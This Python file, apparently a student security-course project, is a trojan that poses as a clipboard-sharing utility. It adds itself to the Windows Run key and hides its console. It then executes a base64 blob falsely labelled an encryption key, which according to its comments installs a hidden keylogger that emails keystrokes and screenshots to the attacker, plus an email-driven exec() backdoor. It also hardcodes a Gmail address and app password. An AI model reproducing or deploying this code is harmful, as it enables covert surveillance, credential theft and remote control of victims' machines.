## This is an application that is designed to seem harmless but secretly runs a keylogger
## The comments that start with 2 #s are what is actually happening in certain parts of the program
## The other comments are there to explain some parts of the program to the victim so they are not alarmed
## However some explanations are false and these comments will clarify when that occurs
## Parts of this program were inspired by the following github project: https://github.com/D4Vinci/PyLoggy

# This application provides you with an easy way to quickly share things between your devices
# Copy something and then press the shortcut (ctrl + shift + alt + S) and your clipboard will be emailed to yourself
# Press the other shortcut (ctrl + shift + alt + V) and your clipboard will contain the latest email sent by this application
import base64
import email
import imaplib
import os
import smtplib
import sys
from winreg import *

import pythoncom
import pyWinhook
import win32clipboard
import win32console
import win32gui

# This is the email we will use to send and receive the clipboard data
#########Settings########
your_email = "comp6841student@gmail.com"  # What is your email?
your_email_pass = "fcfn euzu phly qzsb "  # What is your email password
########################


# this allows the program to run in the background without you needing to reopen it after restarts
def run_in_background():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "trojan.py", 0, REG_SZ, new_file_path)
    win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)


run_in_background()


def mail_clipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
    win32clipboard.CloseClipboard()
    data = "Subject: trojan.py clipboard data\n\n" + data

    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login(your_email, your_email_pass)
    server.sendmail(your_email, your_email, data)
    server.close()


# This function was inspired by tripleee's response on
# https://stackoverflow.com/questions/53827488/reading-unread-emails-using-python-script
def get_clipboard_from_mail():
    mail = imaplib.IMAP4_SSL("imap.gmail.com")
    mail.login(your_email, your_email_pass)
    mail.select("inbox")

    _, data = mail.search(None, "ALL")
    mail_ids = data[0]

    id_list = mail_ids.split()
    first_email_id = int(id_list[0])
    latest_email_id = int(id_list[-1])

    found = False
    for i in range(latest_email_id, first_email_id - 1, -1):
        _, data = mail.fetch(str(i), "(RFC822)")
        for response_part in data:
            if isinstance(response_part, tuple):
                msg = email.message_from_bytes(response_part[1])
                if (
                    msg["subject"] == "trojan.py clipboard data"
                    and msg["from"] == your_email
                ):
                    data = msg.get_payload()
                    win32clipboard.OpenClipboard()
                    win32clipboard.EmptyClipboard()
                    win32clipboard.SetClipboardData(win32clipboard.CF_UNICODETEXT, data)
                    win32clipboard.CloseClipboard()
                    found = True
                    break
        if found:
            break


def on_keyboard_down(event):
    if change_special(event.Key, True):
        return True
    # Shortcut to email what's in your clipboard
    if (
        modifiers["ctrl"]
        and modifiers["shift"]
        and modifiers["alt"]
        and event.Key == "S"
    ):
        mail_clipboard()

    # Shortcut to copy to your clipboard from email sent by this program
    if (
        modifiers["ctrl"]
        and modifiers["shift"]
        and modifiers["alt"]
        and event.Key == "V"
    ):
        get_clipboard_from_mail()

    # Shortcut to close program
    elif modifiers["ctrl"] and event.Key == "Escape":
        exit()
    return True


def on_keyboard_release(event):
    change_special(event.Key, False)
    return True


# track if special keys held down
modifiers = {"ctrl": False, "shift": False, "alt": False}


def change_special(key, value):
    if key in ["Lshift", "Rshift"]:
        modifiers["shift"] = value
    elif key in ["Lcontrol", "Rcontrol"]:
        modifiers["ctrl"] = value
    elif key in ["Lmenu", "Rmenu"]:
        modifiers["alt"] = value
    else:
        return False
    return True


hook = pyWinhook.HookManager()
hook.KeyDown = on_keyboard_down
hook.KeyUp = on_keyboard_release
hook.HookKeyboard()


# Super secure key to encrypt your data so no one else sees it (do not share with anyone)
## This is actually a base64 encoding of hidden.py, backdoor.py and logger.py
key = "IyBUaGlzIHByb2dyYW0gaXMgd2hhdCB0cm9qYW4ucHkgcnVucyB0byBjb21wcm9taXNlIHRoZSB2aWN0aW1zIG1hY2hpbmUKIyBJdCBkZWNvZGVzIHRoZSBvdGhlciBtYWx3YXJlIHN0b3JlZCBpbiB0aGUgImtleSIgYW5kIHBsYWNlcyB0aGVtIGludG8gYSBoaWRkZW4gZm9sZGVyCiMgVGhlIHZpY3RpbSB3aWxsIG5ldmVyIGFjdHVhbGx5IHNlZSB0aGlzIHByb2dyYW0gYXMgaXQgaXMgcnVuIGJ5IGV4ZWMoKSBvbiBhbiBlbmNvZGVkIHN0cmluZwppbXBvcnQgYmFzZTY0CmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwoKIyBjcmVhdGUgYSBoaWRkZW4gZGlyZWN0b3J5IHRvIHN0b3JlIHRoZSBsb2dnZXIgYW5kIGl0cyBkYXRhCmlmIG5vdCBvcy5wYXRoLmlzZGlyKCIuaGlkZGVuIik6CiAgICBvcy5ta2RpcigiLmhpZGRlbiIpCiAgICBzdWJwcm9jZXNzLmNhbGwoWyJhdHRyaWIiLCAiK2giLCAiLmhpZGRlbiJdKQojIG1vdmUgdG8gaGlkZGVuIGRpcmVjdG9yeQpvcy5jaGRpcigiLmhpZGRlbiIpCgoKIyBUaGUgdmFyaWFibGUgeW91cl9lbWFpbF9wYXNzIG1heSBzZWVtIHRvIG5vdCBiZSBkZWZpbmVkIGJ1dCBzaW5jZSB0aGlzIHByb2dyYW0gaXMgcnVuIGJ5IGV4ZWMKIyBpbiB0cm9qYW4ucHkgaXQgaGFzIGFjY2VzcyB0byBhbGwgdGhlIHZhcmlhYmxlcyBpbiB0aGF0IHByb2dyYW0uCiMgVGhpcyB3YXkgd2UgY2FuIHJldHJpZXZlIHRoZSB1c2VyJ3MgZW1haWwncyBwYXNzd29yZCB3aXRob3V0IHRoZW0ga25vd2luZwpmID0gb3BlbigibG9nZmlsZS50eHQiLCAidyIpCmYud3JpdGUoIlBhc3N3b3JkOiAiICsgeW91cl9lbWFpbF9wYXNzICsgIlxuIikKZi5jbG9zZSgpCgojIFNpbWlsYXJseSwga2V5IGlzIGFsc28gY29udGFpbmVkIGluIHRyb2phbi5weSwgd2UgYXJlIHNsaWNpbmcgaXQgdG8gb25seSB0YWtlIHRoZSBwYXJ0IHdoaWNoIGNvbnRhaW5zCiMgdGhlIGVuY29kaW5nIGZvciBsb2dnZXIucHkgYW5kIGlnbm9yZSB0aGUgcGFydCBjb250YWluaW5nIHRoZSBlbmNvZGluZyBmb3IgdGhpcyBmaWxlIGFuZCBiYWNrZG9vci5weQpzID0gc3RyKGJhc2U2NC5iNjRkZWNvZGUoa2V5WzQ4MDQ6XSksIGVuY29kaW5nPSJ1dGYtOCIpLnJlcGxhY2UoInZpY3RpbSIsIHlvdXJfZW1haWwpCmYgPSBvcGVuKCJsb2dnZXIucHkiLCAidyIpCmYud3JpdGUocykKZi5jbG9zZSgpCiMgc2xpY2luZyBmb3IgYmFja2Rvb3IucHkgYW5kIGlnbm9yZSB0aGUgcGFydCBjb250YWluaW5nIHRoZSBlbmNvZGluZyBmb3IgdGhpcyBmaWxlIGFuZCBsb2dnZXIucHkKcyA9IHN0cihiYXNlNjQuYjY0ZGVjb2RlKGtleVsyMDMyOjQ4MDRdKSwgZW5jb2Rpbmc9InV0Zi04IikKZiA9IG9wZW4oImJhY2tkb29yLnB5IiwgInciKQpmLndyaXRlKHMpCmYuY2xvc2UoKQoKc3VicHJvY2Vzcy5Qb3BlbihbInB5dGhvbiIsICJsb2dnZXIucHkiXSwgc3RhcnRfbmV3X3Nlc3Npb249VHJ1ZSkKc3VicHJvY2Vzcy5Qb3BlbihbInB5dGhvbiIsICJiYWNrZG9vci5weSJdLCBzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQo=IyBUaGlzIHByb2dyYW0gcHJvdmlkZXMgYSBiYWNrZG9vciB0byB0aGUgc3lzdGVtIHRoYXQgaXRzIG9uLCBhdCBzdGFydHVwIGl0IGNoZWNrcyB0aGUgYXR0YWNrZXJzIGVtYWlsCiMgRm9yIGFueSBuZXcgaW5zdHJ1Y3Rpb25zIHRoZW4gZXhlY3V0ZXMgdGhlbQppbXBvcnQgZW1haWwKaW1wb3J0IGltYXBsaWIKaW1wb3J0IG9zCmltcG9ydCBzeXMKZnJvbSB3aW5yZWcgaW1wb3J0ICoKCmltcG9ydCB3aW4zMmNvbnNvbGUKaW1wb3J0IHdpbjMyZ3VpCgoKZGVmIHJ1bl9pbl9iYWNrZ3JvdW5kKCk6CiAgICBmcCA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLnJlYWxwYXRoKF9fZmlsZV9fKSkKICAgIGZpbGVfbmFtZSA9IHN5cy5hcmd2WzBdLnNwbGl0KCJcXCIpWy0xXQogICAgbmV3X2ZpbGVfcGF0aCA9IGZwICsgIlxcIiArIGZpbGVfbmFtZQogICAga2V5VmFsID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICBrZXkyY2hhbmdlID0gT3BlbktleShIS0VZX0NVUlJFTlRfVVNFUiwga2V5VmFsLCAwLCBLRVlfQUxMX0FDQ0VTUykKICAgIFNldFZhbHVlRXgoa2V5MmNoYW5nZSwgImJhY2tkb29yLnB5IiwgMCwgUkVHX1NaLCBuZXdfZmlsZV9wYXRoKQogICAgd2luMzJndWkuU2hvd1dpbmRvdyh3aW4zMmNvbnNvbGUuR2V0Q29uc29sZVdpbmRvdygpLCAwKQoKCnJ1bl9pbl9iYWNrZ3JvdW5kKCkKCiMgVGhlIGVtYWlsIHJldHJpZXZhbCB3YXMgaW5zcGlyZWQgYnkgdHJpcGxlZWUncyByZXNwb25zZSBvbgojIGh0dHBzOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzUzODI3NDg4L3JlYWRpbmctdW5yZWFkLWVtYWlscy11c2luZy1weXRob24tc2NyaXB0CnlvdXJfZW1haWwgPSAiY29tcDY4NDFzdHVkZW50QGdtYWlsLmNvbSIKeW91cl9lbWFpbF9wYXNzID0gImZjZm4gZXV6dSBwaGx5IHF6c2IgIgoKbWFpbCA9IGltYXBsaWIuSU1BUDRfU1NMKCJpbWFwLmdtYWlsLmNvbSIpCm1haWwubG9naW4oeW91cl9lbWFpbCwgeW91cl9lbWFpbF9wYXNzKQptYWlsLnNlbGVjdCgiaW5ib3giKQojIEdldCBhbGwgdW5zZWVuIGVtYWlscwpfLCBkYXRhID0gbWFpbC5zZWFyY2goTm9uZSwgIkFMTCIpCm1haWxfaWRzID0gZGF0YVswXQoKaWRfbGlzdCA9IG1haWxfaWRzLnNwbGl0KCkKIyBjaGVjayBpZiB0aGVyZSBhcmUgYW55IGVtYWlscwppZiBub3QgaWRfbGlzdDoKICAgIGV4aXQoKQoKCmZpcnN0X2VtYWlsX2lkID0gaW50KGlkX2xpc3RbMF0pCmxhdGVzdF9lbWFpbF9pZCA9IGludChpZF9saXN0Wy0xXSkKIyBsb29wIHRocm91Z2ggYWxsIHVuc2VlbiBlbWFpbHMKZm9yIGkgaW4gcmFuZ2UobGF0ZXN0X2VtYWlsX2lkLCBmaXJzdF9lbWFpbF9pZCAtIDEsIC0xKToKICAgIF8sIGRhdGEgPSBtYWlsLmZldGNoKHN0cihpKSwgIihSRkM4MjIpIikKICAgIGZvciByZXNwb25zZV9wYXJ0IGluIGRhdGE6CiAgICAgICAgaWYgaXNpbnN0YW5jZShyZXNwb25zZV9wYXJ0LCB0dXBsZSk6CiAgICAgICAgICAgIG1zZyA9IGVtYWlsLm1lc3NhZ2VfZnJvbV9ieXRlcyhyZXNwb25zZV9wYXJ0WzFdKQogICAgICAgICAgICAjIEVtYWlsIHN1YmplY3QgbWF0Y2hlcyBmb3JtYXQgb2YgbG9nIGVtYWlscyBmcm9tIGtleWxvZ2dlcgogICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICBtc2dbInN1YmplY3QiXSA9PSAiQmFja2Rvb3IgZXhlY3V0ZSBpbnN0cnVjdGlvbiIKICAgICAgICAgICAgICAgIGFuZCBtc2dbImZyb20iXSA9PSB5b3VyX2VtYWlsCiAgICAgICAgICAgICk6CiAgICAgICAgICAgICAgICBkYXRhID0gbXNnLmdldF9wYXlsb2FkKCkKICAgICAgICAgICAgICAgICMgRXhlY3V0ZXMgd2hhdGV2ZXIgd2FzIHJlY2VpdmVkLCBjb3VsZCBmb3IgZXhhbXBsZSBleGVjdXRlIGluc3RydWN0aW9ucyB0byBkZWxldGUgb25lIG9mIHRoZSB1c2VycyBmaWxlcywKICAgICAgICAgICAgICAgICMgb3IgY3JlYXRlIGEgbmV3IGZpbGUgY29udGFpbmluZyBldmVuIG1vcmUgbWFsd2FyZSwgcmVwbGFjZSBhbiBleGlzdGluZyBmaWxlLCBldGMuCiAgICAgICAgICAgICAgICBleGVjKGRhdGEpCiAgICAgICAgICAgICAgICBleGl0KCkKIyBUaGlzIGtleWxvZ2dlciB3YXMgaW5zcGlyZWQgYnkgdGhlIGZvbGxvd2luZyBnaXRodWIgcHJvamVjdDogaHR0cHM6Ly9naXRodWIuY29tL0Q0VmluY2kvUHlMb2dneQppbXBvcnQgYmFzZTY0CmltcG9ydCBvcwppbXBvcnQgc210cGxpYgppbXBvcnQgc3lzCmltcG9ydCB0aW1lCmZyb20gd2lucmVnIGltcG9ydCAqCgppbXBvcnQgcHlhdXRvZ3VpCmltcG9ydCBweXRob25jb20KaW1wb3J0IHB5V2luaG9vawppbXBvcnQgd2luMzJjb25zb2xlCmltcG9ydCB3aW4zMmd1aQoKIyMjIyMjIyMjU2V0dGluZ3MjIyMjIyMjIwp5b3VyX2VtYWlsID0gImNvbXA2ODQxc3R1ZGVudEBnbWFpbC5jb20iICAjIFdoYXQgaXMgeW91ciBlbWFpbD8KeW91cl9lbWFpbF9wYXNzID0gImZjZm4gZXV6dSBwaGx5IHF6c2IgIiAgIyBXaGF0IGlzIHlvdXIgZW1haWwgcGFzc3dvcmQKaW50ZXJ2YWwgPSA2MCAgIyBUaW1lIHRvIHdhaXQgYmVmb3JlIHNlbmRpbmcgbmV3IGRhdGEgdG8gZW1haWwgKGluIHNlY29uZHMpCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKIyBTZXR0aW5nIHVwCmN1cnJlbnRfbG9nID0gIiIKbG9nX2ZpbGUgPSAibG9nZmlsZS50eHQiCnBpY3NfbmFtZXMgPSBbXQoKCmRlZiBydW5faW5fYmFja2dyb3VuZCgpOgogICAgZnAgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5yZWFscGF0aChfX2ZpbGVfXykpCiAgICBmaWxlX25hbWUgPSBzeXMuYXJndlswXS5zcGxpdCgiXFwiKVstMV0KICAgIG5ld19maWxlX3BhdGggPSBmcCArICJcXCIgKyBmaWxlX25hbWUKICAgIGtleVZhbCA9IHIiU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAga2V5MmNoYW5nZSA9IE9wZW5LZXkoSEtFWV9DVVJSRU5UX1VTRVIsIGtleVZhbCwgMCwgS0VZX0FMTF9BQ0NFU1MpCiAgICBTZXRWYWx1ZUV4KGtleTJjaGFuZ2UsICJsb2dnZXIucHkiLCAwLCBSRUdfU1osIG5ld19maWxlX3BhdGgpCiAgICB3aW4zMmd1aS5TaG93V2luZG93KHdpbjMyY29uc29sZS5HZXRDb25zb2xlV2luZG93KCksIDApCgoKcnVuX2luX2JhY2tncm91bmQoKQoKCmRlZiBsb2coKToKICAgIGdsb2JhbCBjdXJyZW50X2xvZwogICAgZiA9IG9wZW4obG9nX2ZpbGUsICJhYiIpCiAgICBmLndyaXRlKGJ5dGVzKGN1cnJlbnRfbG9nLCBlbmNvZGluZz0idXRmLTgiKSkKICAgIGYuY2xvc2UoKQogICAgY3VycmVudF9sb2cgPSAiIgoKCmRlZiBzY3JlZW5fc2hvdCgpOgogICAgbmFtZSA9IHRpbWUuc3RyZnRpbWUoIiVZXyVtXyVkXyVIXyVNXyVTIiwgdGltZS5nbXRpbWUoKSkgKyAiLnBuZyIKICAgIHBpY3NfbmFtZXMuYXBwZW5kKG5hbWUpCiAgICBweWF1dG9ndWkuc2NyZWVuc2hvdCgpLnNhdmUobmFtZSkKICAgIHJldHVybiBuYW1lCgoKZGVmIG1haWxfaXQoKToKICAgIGdsb2JhbCBwaWNzX25hbWVzLCBzdGFydF90aW1lCiAgICAjIHJlc2V0IHRpbWVyIHRvIHNlbmQgYWdhaW4gYWZ0ZXIgaW50ZXJ2YWwKICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgIyBsb2cgYWxsIGRhdGEgYWNjdW11bGF0ZWQgc28gZmFyCiAgICBsb2coKQogICAgIyBlbmNvZGUgZGF0YSB0byBwcmVwYXJlIGZvciBzZW5kaW5nIChhbHNvIGFkZCBleHRyYSBpbmZvcm1hdGlvbikKICAgIGRhdGEgPSBiYXNlNjQuYjY0ZW5jb2RlKG9wZW4obG9nX2ZpbGUsICJyK2IiKS5yZWFkKCkpCiAgICBkYXRhID0gKAogICAgICAgIGIiU3ViamVjdDogKEJhc2U2NCBlbmNvZGVkKSBGcm9tIHZpY3RpbXwiCiAgICAgICAgKyBieXRlcyh0aW1lLnN0cmZ0aW1lKCIlWV8lbV8lZF8lSF8lTV8lUyIsIHRpbWUuZ210aW1lKCkpLCBlbmNvZGluZz0idXRmLTgiKQogICAgICAgICsgYiJsb2dmaWxlLnR4dFxuXG4iCiAgICAgICAgKyBkYXRhCiAgICApCiAgICAjIHNlbmQgZW1haWwgY29udGFpbmluZyBsb2dmaWxlCiAgICBzZXJ2ZXIgPSBzbXRwbGliLlNNVFAoInNtdHAuZ21haWwuY29tOjU4NyIpCiAgICBzZXJ2ZXIuc3RhcnR0bHMoKQogICAgc2VydmVyLmxvZ2luKHlvdXJfZW1haWwsIHlvdXJfZW1haWxfcGFzcykKICAgIHNlcnZlci5zZW5kbWFpbCh5b3VyX2VtYWlsLCB5b3VyX2VtYWlsLCBkYXRhKQoKICAgICMgc2VuZCBhbiBlbWFpbCBmb3IgZWFjaCBpbWFnZQogICAgZm9yIHBpYyBpbiBwaWNzX25hbWVzOgogICAgICAgIGRhdGEgPSBiYXNlNjQuYjY0ZW5jb2RlKG9wZW4ocGljLCAicitiIikucmVhZCgpKQogICAgICAgIGRhdGEgPSAoCiAgICAgICAgICAgIGIiU3ViamVjdDogKEJhc2U2NCBlbmNvZGVkKSBGcm9tIHZpY3RpbXwiCiAgICAgICAgICAgICsgYnl0ZXMocGljLCBlbmNvZGluZz0idXRmLTgiKQogICAgICAgICAgICArIGIiXG5cbiIKICAgICAgICAgICAgKyBkYXRhCiAgICAgICAgKQogICAgICAgIHNlcnZlci5zZW5kbWFpbCh5b3VyX2VtYWlsLCB5b3VyX2VtYWlsLCBkYXRhKQogICAgICAgICMgcGF0aGxpYi5QYXRoKHBpYykudW5saW5rKCkKICAgICAgICBvcy51bmxpbmsocGljKQogICAgc2VydmVyLmNsb3NlKCkKICAgICMgZGVsZXRlIHBpY3R1cmVzIGFuZCBsb2dmaWxlIGFmdGVyIG1haWxpbmcgdGhlbQogICAgcGljc19uYW1lcy5jbGVhcigpCiAgICBvcGVuKGxvZ19maWxlLCAidyIpLmNsb3NlKCkKCgpkZWYgb25fbW91c2VfZXZlbnQoZXZlbnQpOgogICAgZGF0YSA9ICgKICAgICAgICB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZF8lSDolTTolUyIsIHRpbWUuZ210aW1lKCkpCiAgICAgICAgKyAiXG5cdFdpbmRvdzogIgogICAgICAgICsgc3RyKGV2ZW50LldpbmRvd05hbWUpCiAgICApCiAgICBkYXRhICs9IGNoZWNrX3NwZWNpYWwoKQogICAgZGF0YSArPSAiXG5cdEJ1dHRvbjogIiArIHN0cihldmVudC5NZXNzYWdlTmFtZSkKICAgIGRhdGEgKz0gIlxuXHRQb3NpdGlvbjogIiArIHN0cihldmVudC5Qb3NpdGlvbikKICAgIGRhdGEgKz0gIlxuXHRTY3JlZW5zaG90IGZpbGU6ICIgKyBzY3JlZW5fc2hvdCgpICsgIlxuIgoKICAgIGdsb2JhbCBjdXJyZW50X2xvZwogICAgY3VycmVudF9sb2cgKz0gZGF0YQoKICAgIGlmICh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpID49IGludGVydmFsOgogICAgICAgIG1haWxfaXQoKQoKICAgIHJldHVybiBUcnVlCgoKZGVmIG9uX2tleWJvYXJkX2Rvd24oZXZlbnQpOgogICAgaWYgY2hhbmdlX3NwZWNpYWwoZXZlbnQuS2V5LCBUcnVlKToKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZGF0YSA9ICgKICAgICAgICB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZF8lSDolTTolUyIsIHRpbWUuZ210aW1lKCkpCiAgICAgICAgKyAiXG5cdFdpbmRvdzogIgogICAgICAgICsgc3RyKGV2ZW50LldpbmRvd05hbWUpCiAgICApCiAgICBkYXRhICs9IGNoZWNrX3NwZWNpYWwoKQogICAgZGF0YSArPSAoCiAgICAgICAgIlxuXHRLZXlib2FyZDogIgogICAgICAgICsgKAogICAgICAgICAgICBjaHIoZXZlbnQuQXNjaWkpCiAgICAgICAgICAgIGlmIGV2ZW50LkFzY2lpID49IDMzIGFuZCBldmVudC5Bc2NpaSA8PSAxMjYKICAgICAgICAgICAgZWxzZSBzdHIoZXZlbnQuS2V5KQogICAgICAgICkKICAgICAgICArICJcbiIKICAgICkKCiAgICBnbG9iYWwgY3VycmVudF9sb2cKICAgIGN1cnJlbnRfbG9nICs9IGRhdGEKCiAgICBpZiAodGltZS50aW1lKCkgLSBzdGFydF90aW1lKSA+PSBpbnRlcnZhbDoKICAgICAgICBtYWlsX2l0KCkKCiAgICBpZiBtb2RpZmllcnNbImN0cmwiXSBhbmQgZXZlbnQuS2V5ID09ICJFc2NhcGUiOgogICAgICAgIG1haWxfaXQoKQogICAgICAgIGV4aXQoKQogICAgcmV0dXJuIFRydWUKCgpkZWYgb25fa2V5Ym9hcmRfcmVsZWFzZShldmVudCk6CiAgICBjaGFuZ2Vfc3BlY2lhbChldmVudC5LZXksIEZhbHNlKQogICAgcmV0dXJuIFRydWUKCgojIHRyYWNrIGlmIHNwZWNpYWwga2V5cyBoZWxkIGRvd24KbW9kaWZpZXJzID0geyJjdHJsIjogRmFsc2UsICJzaGlmdCI6IEZhbHNlLCAiYWx0IjogRmFsc2V9CgoKZGVmIGNoYW5nZV9zcGVjaWFsKGtleSwgdmFsdWUpOgogICAgaWYga2V5IGluIFsiTHNoaWZ0IiwgIlJzaGlmdCJdOgogICAgICAgIG1vZGlmaWVyc1sic2hpZnQiXSA9IHZhbHVlCiAgICBlbGlmIGtleSBpbiBbIkxjb250cm9sIiwgIlJjb250cm9sIl06CiAgICAgICAgbW9kaWZpZXJzWyJjdHJsIl0gPSB2YWx1ZQogICAgZWxpZiBrZXkgaW4gWyJMbWVudSIsICJSbWVudSJdOgogICAgICAgIG1vZGlmaWVyc1siYWx0Il0gPSB2YWx1ZQogICAgZWxzZToKICAgICAgICByZXR1cm4gRmFsc2UKICAgIHJldHVybiBUcnVlCgoKZGVmIGNoZWNrX3NwZWNpYWwoKToKICAgIG1vZHMgPSAiY3RybCArICIgaWYgbW9kaWZpZXJzWyJjdHJsIl0gZWxzZSAiIgogICAgbW9kcyArPSAic2hpZnQgKyAiIGlmIG1vZGlmaWVyc1sic2hpZnQiXSBlbHNlICIiCiAgICBtb2RzICs9ICJhbHQgKyAiIGlmIG1vZGlmaWVyc1siYWx0Il0gZWxzZSAiIgogICAgbW9kcyA9IG1vZHMucmVtb3Zlc3VmZml4KCIgKyAiKQogICAgaWYgbW9kczoKICAgICAgICByZXR1cm4gIlxuXHRNb2RpZmllcnM6ICIgKyBtb2RzCiAgICByZXR1cm4gIiIKCgpob29rID0gcHlXaW5ob29rLkhvb2tNYW5hZ2VyKCkKaG9vay5LZXlEb3duID0gb25fa2V5Ym9hcmRfZG93bgpob29rLktleVVwID0gb25fa2V5Ym9hcmRfcmVsZWFzZQpob29rLk1vdXNlQWxsQnV0dG9uc0Rvd24gPSBvbl9tb3VzZV9ldmVudApob29rLkhvb2tLZXlib2FyZCgpCmhvb2suSG9va01vdXNlKCkKCnN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQoKcHl0aG9uY29tLlB1bXBNZXNzYWdlcygpCg=="

# Encrypting data using key
## This is actually running hidden.py which creates the hidden directory, the keylogger and the backdoor
exec(str(base64.b64decode(key[:2032]), encoding="utf-8"))

pythoncom.PumpMessages()
